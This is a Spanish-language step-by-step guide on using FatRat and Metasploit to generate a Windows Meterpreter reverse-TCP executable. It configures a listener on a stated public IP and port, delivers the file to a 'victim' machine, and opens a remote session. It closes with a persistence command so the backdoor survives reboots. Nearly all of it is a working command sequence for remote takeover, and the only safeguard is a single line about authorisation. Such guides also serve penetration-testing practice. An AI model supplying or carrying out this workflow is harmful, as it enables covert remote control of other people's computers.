**Guía para el Uso de Metasploit y FatRat para Explotación y Control Remoto**
Índice
Introducción
Configuración del Entorno
Uso de FatRat para Generar un Payload
Configuración y Ejecución de Metasploit
Ejecución del Payload en la Máquina Víctima
Solución de Problemas
Notas Adicionales
Introducción
Este documento proporciona una guía paso a paso sobre cómo usar Metasploit y FatRat para generar un payload, configurarlo y explotarlo en una máquina Windows desde una máquina Kali Linux en la nube.

IP Pública de la Máquina Kali Linux: 20.51.215.235
Puerto Utilizado: 6666

Configuración del Entorno
Máquina Kali Linux:

Instalación en Azure o en un entorno en la nube.
Asegúrate de que Metasploit y FatRat estén instalados y actualizados.
Máquina Windows (Víctima):

Configurada con un sistema operativo Windows 10 para pruebas.
Se deben permitir conexiones entrantes para probar el payload.
Uso de FatRat para Generar un Payload
Inicia FatRat en Kali Linux:

bash
Copiar código
fatrat
Selecciona el Tipo de Payload:

Elige el tipo de payload que deseas generar. Para Windows, selecciona la opción:
Copiar código
2) WINDOWS >> FatRat.exe
Configura el Payload:

LHOST: La IP pública de tu máquina Kali Linux (20.51.215.235).
LPORT: Puerto a usar (6666).
Tipo de Payload: Elige windows/meterpreter/reverse_tcp.
Genera el Payload:

Proporciona un nombre base para el archivo, por ejemplo, ejecutable.
FatRat generará un archivo .exe en el directorio especificado.
bash
Copiar código
/root/Fatrat_Generated/ejecutable.exe
Configuración y Ejecución de Metasploit
Inicia Metasploit:

bash
Copiar código
msfconsole
Configura el Handler en Metasploit:

bash
Copiar código
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 20.51.215.235
set LPORT 6666
exploit
PAYLOAD: Tipo de payload utilizado.
LHOST: IP pública de la máquina Kali.
LPORT: Puerto en el que Metasploit escuchará las conexiones entrantes.
Ejecución del Payload en la Máquina Víctima
Transfiere el Payload al Sistema Windows:

Usa un método de transferencia, como HTTP, FTP, o una unidad USB para mover el archivo ejecutable.exe a la máquina Windows.
Ejecuta el Payload:

Abre el archivo ejecutable.exe en la máquina Windows. Esto iniciará una conexión de reverso hacia tu máquina Kali.
Establece la Sesión Meterpreter:

Cuando el payload se ejecute, Metasploit debería abrir una sesión Meterpreter en la consola.
bash
Copiar código
meterpreter > sysinfo
meterpreter > getuid
Solución de Problemas
Conexión Fallida:

Asegúrate de que el firewall en la máquina Windows no esté bloqueando la conexión.
Verifica que el puerto 6666 esté abierto y escuchando en tu máquina Kali.
Timeouts y Errores:

Ajusta el timeout de las sesiones en Metasploit con:
bash
Copiar código
sessions -i <ID> --timeout <valor>
Verificación del Listener:

Usa netstat para verificar que el puerto 6666 esté en uso:
bash
Copiar código
netstat -an | grep 6666
Notas Adicionales
Persistencia: Si necesitas que el payload se ejecute automáticamente después de un reinicio, configura la persistencia en Metasploit:

bash
Copiar código
run persistence -X -i 10 -p 6666 -r 20.51.215.235
Seguridad: Asegúrate de tener permiso explícito para realizar pruebas en las máquinas objetivo. La explotación no autorizada es ilegal y poco ética.

Actualizaciones: Mantén tanto Metasploit como FatRat actualizados para asegurar la compatibilidad y las últimas características.
